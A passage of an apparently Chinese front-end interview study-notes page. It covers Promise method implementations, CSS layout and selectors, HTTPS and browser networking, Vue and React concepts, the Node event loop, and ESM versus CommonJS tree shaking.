=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(promiseList)) &#123;</span><br><span class="line">      <span class="title function_">reject</span>(<span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&quot;参数错误！&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> valueList = <span class="keyword">new</span> <span class="title class_">Array</span>(promiseList.<span class="property">length</span>);</span><br><span class="line">    promiseList.<span class="title function_">forEach</span>(<span class="function">(<span class="params">promise, index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(promise).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">          count++;</span><br><span class="line">          valueList[index] = result; <span class="comment">//  将每次返回的结果搜集起来</span></span><br><span class="line">          <span class="keyword">if</span> (count === promiseList.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="comment">//  表示所有的promise都有结果，最终将所有的结果都resolve出去</span></span><br><span class="line">            <span class="title function_">resolve</span>(valueList);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="title function_">reject</span>(err)</span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Promise.race：Promise.race() 静态方法接受一个 promise 可迭代对象作为输入，并返回一个 Promise。如果其中一个 promise 处于 fulfilled 或者 reject 后，Promise.race 所创建的 promise 会立刻被敲定，执行 then 或者 catch 逻辑。未敲定的 promise 仍会执行，但不会影响 Promise.race 所创建的 promise 了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="property">_race</span> = <span class="function">(<span class="params">promises</span>) =&gt;</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    promises.<span class="title function_">forEach</span>(<span class="function">(<span class="params">promise</span>) =&gt;</span> &#123;</span><br><span class="line">      promise.<span class="title function_">then</span>(resolve, reject);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>Promise.allSettled：<code>Promise.allSettled()</code>  可以获取数组中每个  <code>promise</code>  的结果，无论成功或失败。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">rejectHandler</span> = (<span class="params">reason</span>) =&gt; (&#123; <span class="attr">status</span>: <span class="string">&quot;rejected&quot;</span>, reason &#125;);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">resolveHandler</span> = (<span class="params">value</span>) =&gt; (&#123; <span class="attr">status</span>: <span class="string">&quot;fulfilled&quot;</span>, value &#125;);</span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">allSettled</span> = <span class="function">(<span class="params">promises</span>) =&gt;</span></span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">all</span>(</span><br><span class="line">    promises.<span class="title function_">map</span>(<span class="function">(<span class="params">promise</span>) =&gt;</span></span><br><span class="line">      <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(promise).<span class="title function_">then</span>(resolveHandler, rejectHandler)</span><br><span class="line">    )</span><br><span class="line">  );</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">MyPromise</span>.<span class="property">allSettled</span> = <span class="keyword">function</span> (<span class="params">values</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> promises = [].<span class="property">slice</span>.<span class="title function_">call</span>(values);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPromise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> result = [],</span><br><span class="line">      count = <span class="number">0</span>;</span><br><span class="line">    promises.<span class="title function_">forEach</span>(<span class="function">(<span class="params">promise</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title class_">MyPromise</span>.<span class="title function_">resolve</span>(promise)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">          result.<span class="title function_">push</span>(&#123; <span class="attr">status</span>: <span class="string">&quot;fulfilled&quot;</span>, value &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">          result.<span class="title function_">push</span>(&#123; <span class="attr">status</span>: <span class="string">&quot;rejected&quot;</span>, <span class="attr">value</span>: err &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">finally</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (++count === promise.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="title function_">resolve</span>(result);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="2-CSS-相关"><a href="#2-CSS-相关" class="headerlink" title="2. CSS 相关"></a>2. CSS 相关</h1><h3 id="元素居中的方案"><a href="#元素居中的方案" class="headerlink" title="元素居中的方案"></a>元素居中的方案</h3><p><a href="https://juejin.cn/post/6844903560879013901">参考文章</a></p><ul><li>垂直居中<ul><li>设置 line-height，适用于文本或图片</li><li>flex 布局</li><li>绝对定为 + margin auto，子元素需要有绝对宽高</li><li>父元素 <code>display: table</code>，子元素 <code>display: table-cell; vertical-align: middle;</code></li><li>绝对定为 + transform</li><li>padding 百分比</li><li>calc</li><li>display: inline-block + vertical-align: middle</li></ul></li></ul><h3 id="纯-CSS-绘制三角形"><a href="#纯-CSS-绘制三角形" class="headerlink" title="纯 CSS 绘制三角形"></a>纯 CSS 绘制三角形</h3><p><a href="https://juejin.cn/post/7075884138900750372">参考文章</a></p><h3 id="CSS-选择器以及其优先级"><a href="#CSS-选择器以及其优先级" class="headerlink" title="CSS 选择器以及其优先级"></a>CSS 选择器以及其优先级</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Specificity">参考文章</a></p><p>重点：</p><ul><li>优先级计算规则 <a href="https://juejin.cn/post/6844903709772611592">参考</a></li><li>掌握常用的选择器</li></ul><h3 id="伪类与伪元素"><a href="#伪类与伪元素" class="headerlink" title="伪类与伪元素"></a>伪类与伪元素</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Selectors/Pseudo-classes_and_pseudo-elements">参考文章</a></p><p>重点：</p><ul><li>伪类与伪元素的区别</li></ul><h3 id="inline-元素"><a href="#inline-元素" class="headerlink" title="inline 元素"></a>inline 元素</h3><ul><li>inline 和 inline-block 元素可以设置 padding，但是纵向的 padding 不会影响其文档流的对其方式</li><li>inline 和 inline-block 元素可以设置横向的 margin，纵向的 margin 不会生效</li></ul><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240510234743.png" alt="image.png|350"></p><h3 id="display-none-visibility-hidden-opacity-0"><a href="#display-none-visibility-hidden-opacity-0" class="headerlink" title="display: none / visibility:hidden / opacity:0"></a>display: none / visibility:hidden / opacity:0</h3><ul><li><code>displa: none</code> 元素在页面上不渲染；</li><li><code>visibility: hidden</code> 元素被隐藏，但占用的位置还在</li><li><code>opacity: 0</code>：元素是可以互动的，因为它们实际上是可见的，只是非常透明</li></ul><h1 id="3-网络原理"><a href="#3-网络原理" class="headerlink" title="3. 网络原理"></a>3. 网络原理</h1><p><a href="https://blog.esunr.site/2021/05/b35dbbf04ee7.html">引用</a></p><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><ul><li><a href="https://www.bilibili.com/video/av70001643">什么是密码学</a>、<a href="https://www.bilibili.com/video/BV1RE411d7ki/?spm_id_from=333.999.0.0&vd_source=b233b2041b0c7ce85a2c9111063e461f">加密通信</a>、<a href="https://www.bilibili.com/video/BV1CE411C7qm/?spm_id_from=333.999.0.0&vd_source=b233b2041b0c7ce85a2c9111063e461f">数字签名</a>，生动展示密码学基础、非对称加密的原理、非对称加密在 HTTPS 中的应用，对理解为什么要使用 HTTPS 以及其工作原理很有帮助<ul><li><a href="https://blog.esunr.site/2019/11/a337085f30b7.html">参考笔记</a></li></ul></li><li><a href="https://juejin.cn/post/6939183379238060069">参考文章</a>，专业但是不生动，作为视频补充观看</li></ul><h3 id="从输入-URL-到页面展示到底发生了什么"><a href="#从输入-URL-到页面展示到底发生了什么" class="headerlink" title="从输入 URL 到页面展示到底发生了什么"></a>从输入 URL 到页面展示到底发生了什么</h3><p><a href="https://zhuanlan.zhihu.com/p/133906695">参考文章</a></p><p>参考文章太多了，上面的是相对完整的，但是冗长，需要自己整理精简后理解，具体的概念去了解对应的专题。</p><p>不要仅局限于参考文章中列出的知识扩展，作者文字过于抽象（比如 TCP 三次握手），没到一个相关的知识扩展，建议去搜这个知识点相关更好更全的文章。</p><p>重点：</p><ul><li>大体描述整个过程</li><li>DNS lookup（向上查找）的过程</li><li>TPC 的三次握手四次挥手，熟练说出整个过程，并明白每个步骤的意义，每次交互发送的报文内容（如 SYN = 1， seq = x）记不住可以不记，最好记住发送报文后服务器与客户端各处的状态。</li><li>命中协商缓存后的过程</li><li>浏览器渲染页面的过程，渲染阻塞的问题 <a href="https://juejin.cn/post/6844903565610188807">参考</a></li></ul><p>这道题是个经典题目，因为涉及的知识面广，每一个步骤都可以深入提问，因此只了解大致过程并没有什么用，很容易被面试管逼问更深层的内容而回答不上来导致减分。</p><p>这道题的回答策略是先跟面试官简述整体的过程，让面试官知道你有一个清晰的思路并且整体流程是正确的，然后再 <strong>主动</strong> 展开详细阐述每个过程的具体经过。如果不能完全掌握这道题的话，一定要努力把自己所知道的一切都倾倒在这个题中，也就是说能回答的多详细就回答多详细（这样还能主动拉长面试时间），把话语权掌握在自己手中，千万不要等着面试管主动向你提问关于这道题更深的内容，这样很容易翻车。</p><h3 id="简单请求和非简单请求"><a href="#简单请求和非简单请求" class="headerlink" title="简单请求和非简单请求"></a>简单请求和非简单请求</h3><p>简单请求：</p><ul><li>GET、POST、HEAD</li><li>没有自定义的请求头</li><li>Content-Type的值只有以下三种：<code>text/plain</code> <code>multipart/form-data</code> <code>application/x-www-form-urlencoded</code></li></ul><p>针对复杂请求，我们需要设置不同的响应头。因为在预检请求的时候会携带相应的请求头信息。</p><p>对于附带身份凭证的请求，服务器不得设置 <code>Access-Control-Allow-Origin</code>的值为“<code>*</code>”。</p><h1 id="4-Vue"><a href="#4-Vue" class="headerlink" title="4. Vue"></a>4. Vue</h1><p><a href="https://www.bilibili.com/video/BV1YM411w7Zc/?spm_id_from=333.337.search-card.all.click&vd_source=b233b2041b0c7ce85a2c9111063e461f">面试题参考视频</a></p><h3 id="Vue-响应式原理"><a href="#Vue-响应式原理" class="headerlink" title="Vue 响应式原理"></a>Vue 响应式原理</h3><p><a href="https://www.bilibili.com/video/BV1u4411W7ei?p=1">Vue2 响应式原理</a>（必须掌握，代码跟着敲一遍）</p><p><a href="https://blog.esunr.site/2019/05/f8fafe36f461.html#1-MVVM">视频参考笔记</a></p><p>Vue2 响应式原理基于 <code>Object.defineProperty</code>，Vue3 响应式原理基于 Proxy，两者思想都是一样的，只不过具体实现不一样而已，先搞懂 Vue2，Vue3 的原理就会很快理解。而且目前<code>Object.defineProperty</code> 比 <code>Proxy</code> 应用更广，了解 Vue2 原理有助于对 Object 的理解。</p><p>重点：</p><ul><li>MVVM（数据双向绑定）的实现</li><li>watch、computed 的原理</li></ul><h3 id="为什么说-Vue-的响应式更新精确到组件级别而-React-不行"><a href="#为什么说-Vue-的响应式更新精确到组件级别而-React-不行" class="headerlink" title="为什么说 Vue 的响应式更新精确到组件级别而 React 不行"></a>为什么说 Vue 的响应式更新精确到组件级别而 React 不行</h3><p>Vue 在组件的依赖发生变化时，就会重新渲染对应的组件，在渲染过程中遇到子节点时会进行 DOM Diff，但是遇到子组件时只会对组件上的 props、listeners 等属性进行更新，而不会深入到组件内部进行更新。假如父组件向子组件传入的 props 发生了变更，那么子组件的 watcher 就会被触发，进而更新子组件。</p><blockquote><p>Vue 每个组件都有自己的<code>渲染 watcher</code>，它掌管了当前组件的视图更新，但是并不会掌管  <code>ChildComponent</code>  的更新。</p></blockquote><p>而在 React 中，组件更新是自顶向下递归更新的，父组件的更新会引起子组件的重新渲染，因为 React 遵循 Immutable 的设计思想，永远不在原对象上修改属性，那么 Vue 的响应式依赖收集就无法实现，React 便无法得知子组件是否需要更新，因此只能将子组件全部重新渲染一遍，然后再使用 Diff 算法来决定哪一部分的视图需要更新。</p><p><a href="https://juejin.cn/post/6844904113432444942">参考文章</a></p><h3 id="v-if-和-v-for-为什么不能一起使用"><a href="#v-if-和-v-for-为什么不能一起使用" class="headerlink" title="v-if 和 v-for 为什么不能一起使用"></a>v-if 和 v-for 为什么不能一起使用</h3><p>在 Vue 生成 DOM 树的算法中，<code>v-for</code> 的优先级高于 <code>v-if</code>，因此会先进行遍历出 DOM 节点，然后在判断元素是否显示，这会造成不必要的性能浪费。</p><p><a href="https://vue3js.cn/interview/vue/if_for.html#%E4%BA%8C%E3%80%81%E4%BC%98%E5%85%88%E7%BA%A7">参考</a></p><h3 id="Vue2-相比-Vue3"><a href="#Vue2-相比-Vue3" class="headerlink" title="Vue2 相比 Vue3"></a>Vue2 相比 Vue3</h3><p>特性：</p><ul><li>原生支持 TypeScript；</li><li>新增了 Composition API，与 Option API 相比代码可读性更好，代码复用更简明，TypeScript 支持更好；</li><li>支持多根节点；</li><li>支持 Teleport；</li></ul><p>性能提升：</p><ul><li>Vue3 对不参与更新的元素，比如没有任何响应式数据参与的普通 DOM 节点，会在编译阶段进行静态提升，渲染时直接使用，并通过一个静态标记，不参与 diff 算法的对比中；</li><li>Vue2 绑定事件行为会被视为动态绑定，所以每次都会去追踪它的变化，而 Vue3 事件监听会被缓存；</li><li>SSR 优化，当静态内容大到一定量级时候，会用<code>createStaticVNode</code>方法在客户端去生成一个 static node，这些静态<code>node</code>，会被直接<code>innerHtml</code>，就不需要创建对象，然后根据对象渲染；</li><li>代码体积更小，支持 Tree shaking；</li><li>使用 Proxy 实现响应式系统（无法兼容 IE），不需要在响应式对象创建时就进行深度遍历所有嵌套对象来挂载响应式，而是在嵌套对象被访问时才将其转化为一个响应式对象（Vue2 没有这么做是设计问题）；</li></ul><p>生命周期：</p><ul><li>Vue3 没有 <code>beforeCreated</code> 和 <code>created</code> 生命周期函数；</li><li><code>setup</code> 在 <code>beforeCreated</code> 前执行；</li><li>Vue3 中在 setup 调用的生命周期函数，如果在 options 中定义了相同类型的回调函数，那么 setup 中调用的声明函数更优先执行，比如 <code>onMounted</code> 在 <code>mounted</code> 之前执行；</li></ul><h3 id="实现一个-Toast-弹窗组件"><a href="#实现一个-Toast-弹窗组件" class="headerlink" title="实现一个 Toast 弹窗组件"></a>实现一个 Toast 弹窗组件</h3><p>组件实现不再多讲，主要讲一下如何将 Toast 组件使用指令方式调用，如调用 <code>showToast(&#123;...&#125;)</code> 后显示在页面上，并且返回一个 <code>destory</code> 方法用于手动销毁 Toast。</p><p>Vue3 中可以用 <code>createVNode</code> 创建组件 VNode 实例，然后使用 <code>render</code> 函数渲染到目标 DOM 上：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createVNode, h, render &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Toast</span> <span class="keyword">from</span> <span class="string">&quot;./index.vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; toastDefaultProps, <span class="keyword">type</span> <span class="title class_">ToastProps</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./const&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">showToast</span> = (<span class="params">options: ToastProps</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> opt = &#123; ...toastDefaultProps, ...options &#125;;</span><br><span class="line">  <span class="keyword">const</span> vnode = <span class="title function_">createVNode</span>(<span class="title class_">Toast</span>, opt);</span><br><span class="line">  <span class="keyword">const</span> container = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  <span class="title function_">render</span>(vnode, container);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(container);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">destroy</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">render</span>(<span class="literal">null</span>, container);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(container);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (opt.<span class="property">delay</span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">destroy</span>();</span><br><span class="line">    &#125;, opt.<span class="property">delay</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    destroy,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此外，还可以使用 <code>createApp</code> 的方式来挂载组件到 DOM 中：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">useMountComponent</span>(<span class="params">component: Component</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="title function_">createApp</span>(component);</span><br><span class="line">  <span class="keyword">const</span> appDom = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(appDom);</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">instance</span>: app.<span class="title function_">mount</span>(appDom),</span><br><span class="line">    <span class="title function_">unmount</span>(<span class="params"></span>) &#123;</span><br><span class="line">      app.<span class="title function_">unmount</span>();</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(appDom);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是 Vue2，可以使用 <code>Vue.extend</code> 的方式获得组件实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Modal</span> <span class="keyword">from</span> <span class="string">&quot;./Modal.vue&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ComponentClass</span> = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(<span class="title class_">Modal</span>);</span><br><span class="line"><span class="keyword">const</span> instance = <span class="keyword">new</span> <span class="title class_">ComponentClass</span>(&#123; <span class="attr">el</span>: <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>) &#125;);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(instance.<span class="property">$el</span>);</span><br></pre></td></tr></table></figure><h3 id="性能优化手段"><a href="#性能优化手段" class="headerlink" title="性能优化手段"></a>性能优化手段</h3><ul><li>props 稳定性，尽量避免 props 频繁更新；</li><li>使用 <code>v-once</code> 可以让组件跳过后续渲染；</li><li>使用 <code>v-memo</code> 可以有条件的跳过某些大型 DOM 结构的更新，甚至连虚拟 DOM 的创建都会被跳过；</li><li>计算属性稳定性，尽可能让 computed 返回一个值类型，而不是引用类型的数据，这样 computed 值会尽可能的减少非必要的副作用触发；</li><li>使用虚拟列表；</li><li>使用 <code>shallowRef</code> 和 <code>shallowReactive</code> 来绕开深度响应；</li><li>避免过多的组件抽象，渲染组件比渲染普通 DOM 节点要昂贵得多；</li></ul><h3 id="常用的-Composition-API"><a href="#常用的-Composition-API" class="headerlink" title="常用的 Composition API"></a>常用的 Composition API</h3><p>核心：</p><ul><li>ref</li><li>reactive</li><li>readonly</li><li>computed</li><li>watch<ul><li>watchEffect：立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行</li><li>watchPostEffect：<a href="https://cn.vuejs.org/api/reactivity-core.html#watcheffect"><code>watchEffect()</code></a>  使用  <code>flush: &#39;post&#39;</code>  选项时的别名。</li><li>watchSyncEffect：<a href="https://cn.vuejs.org/api/reactivity-core.html#watcheffect"><code>watchEffect()</code></a>  使用  <code>flush: &#39;sync&#39;</code>  选项时的别名。</li></ul></li></ul><p>工具：</p><ul><li>isRef</li><li>unref</li><li><a href="https://cn.vuejs.org/api/reactivity-utilities.html#toref">toRef 3.3+</a>: 可以将值、refs 或 getters 规范化为 refs</li><li><a href="https://cn.vuejs.org/api/reactivity-utilities.html#tovalue">toValue 3.3+</a>: 将值、refs 或 getters 规范化为值。这与  <a href="https://cn.vuejs.org/api/reactivity-utilities.html#unref">unref()</a>  类似，不同的是此函数也会规范化 getter 函数。如果参数是一个 getter，它将会被调用并且返回它的返回值。</li><li>toRefs: 将一个响应式对象转换为一个普通对象。<ul><li>当从组合式函数中返回 reactive 对象时，toRefs  相当有用，可以使用 toRefs 包裹 reactive 对象让使用该组合式函数的地方可以通过解构来获取响应式值。</li></ul></li><li>isProxy：检查一个对象是否是由  <a href="https://cn.vuejs.org/api/reactivity-core.html#reactive"><code>reactive()</code></a>、<a href="https://cn.vuejs.org/api/reactivity-core.html#readonly"><code>readonly()</code></a>、<a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowreactive"><code>shallowReactive()</code></a>  或  <a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowreadonly"><code>shallowReadonly()</code></a>  创建的代理。</li><li>isReactive</li><li>isReadonly</li></ul><p>进阶：</p><ul><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowref">shallowRef()</a></li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#triggerref">triggerRef()</a>: 强制触发依赖于一个<a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowref">浅层 ref</a>  的副作用，这通常在对浅引用的内部值进行深度变更后使用。</li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#customref">customRef()</a>: 创建一个自定义的 ref，显式声明对其依赖追踪和更新触发的控制方式。</li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowreactive">shallowReactive()</a></li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowreadonly">shallowReadonly()</a></li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#toraw">toRaw()</a></li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#markraw">markRaw()</a></li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#effectscope">effectScope()</a></li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#getcurrentscope">getCurrentScope()</a></li><li><a href="https://cn.vuejs.org/api/reactivity-advanced.html#onscopedispose">onScopeDispose()</a></li></ul><h1 id="5-React"><a href="#5-React" class="headerlink" title="5. React"></a>5. React</h1><h3 id="常用的-Hook"><a href="#常用的-Hook" class="headerlink" title="常用的 Hook"></a>常用的 Hook</h3><ul><li>useState</li><li>useReducer</li><li>useEffect</li><li>usrLayoutEffect</li><li>useMemo</li><li>useCallback</li></ul><h1 id="6-NodeJS"><a href="#6-NodeJS" class="headerlink" title="6. NodeJS"></a>6. NodeJS</h1><h3 id="setTimeout-fn-0-和-setImmediate-fn-哪个先触发？"><a href="#setTimeout-fn-0-和-setImmediate-fn-哪个先触发？" class="headerlink" title="setTimeout(fn, 0) 和 setImmediate(fn) 哪个先触发？"></a>setTimeout(fn, 0) 和 setImmediate(fn) 哪个先触发？</h3><p>浏览器环境下，哪个写在前面哪个先触发。而在 Node 环境下则不一定哪个先触发。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240507141731.png" alt="20240507141731.png|423"></p><p>在时间循环过程中，定时器在 timers 阶段执行，而 setImmediate 在 check 阶段执行。在执行 <code>setTimeout(fn, 0)</code> 时会去创建一个定时器，即使事件我们传入了 0ms 但实际执行时可能会在 1ms，那么就有可能在执行到 event loop 的 timers 阶段时定时器任务并没有创建好，此时则会执行后面的流程，来到 check 阶段执行 setImmediate 创建的任务，setTimeout 创建的 0ms 任务则在下一个 event loop 执行。</p><p>此外，setTimeout 由于要创建定时器，其耗时要比 setImmediate 更多。</p><p>再看另一种情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 说说下边代码的执行顺序，先打印哪个？</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&quot;./poll.js&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;setTimeout&quot;</span>), <span class="number">0</span>);</span><br><span class="line">  <span class="title function_">setImmediate</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;setImmediate&quot;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这个无论执行多少次，setImmediate 都会比 setTimeout 先执行，因为 IO 异步在 poll 阶段执行，然后执行 check 阶段，定时器将在下一个 event loop 执行。</p><p><a href="https://juejin.cn/post/7010308647792148511">参考</a></p><h1 id="7-构建工具"><a href="#7-构建工具" class="headerlink" title="7. 构建工具"></a>7. 构建工具</h1><h3 id="ESM-和-CJS-的区别"><a href="#ESM-和-CJS-的区别" class="headerlink" title="ESM 和 CJS 的区别"></a>ESM 和 CJS 的区别</h3><ul><li>ES Module 输出的是值的引用，而 CommonJS 输出的是值的拷贝；</li><li>ES Module 是编译时执行，而 CommonJS 模块是在运行时加载；</li></ul><h3 id="为什么-esm-支持-tree-shaking，而-commonjs-不支持"><a href="#为什么-esm-支持-tree-shaking，而-commonjs-不支持" class="headerlink" title="为什么 esm 支持 tree-shaking，而 commonjs 不支持"></a>为什么 esm 支持 tree-shaking，而 commonjs 不支持</h3><ul><li>ESM 是静态的，它在编译时（静态阶段）就能够确定模块的依赖关系和导出内容</li><li>CommonJS 的加载是动态的，它是等到代码执行到时才加载模块，只能在运行时才能确定代码是否被使用</li><li>在 ESM 中，导出的内容是静态的，只能通过 <code>export</code> 关键字显式导出，这使得 tree shaking 更加容易实现。而在 CommonJS 中，导出的内容是通过 <code>module.exports</code> 或 <code>exports</code> 动态赋值的，这使得很难在编译时确定导出的内容，从而难以进行有效的 tree shaking。</li></ul><h3 id="Tree-shaking-的实现"><a href="#Tree-shaking-的实现" class="headerlink" title="Tree shaking 的实现"></a>Tree shaking 的实现</h3><ul><li><strong>Make 阶段，收集模块导出变量并记录到模块依赖关系图 ModuleGraph 变量中：</strong><ul><li>将模块的所有 <strong>ESM 导出语句转换为 Dependency 对象</strong>，并记<strong>录到 module 对象的 dependencies 集合</strong>；</li><li>所有模块都编译完毕后，触发 compilation.hooks.finishModules 钩子，开始<strong>执行 FlagDependencyExportsPlugin 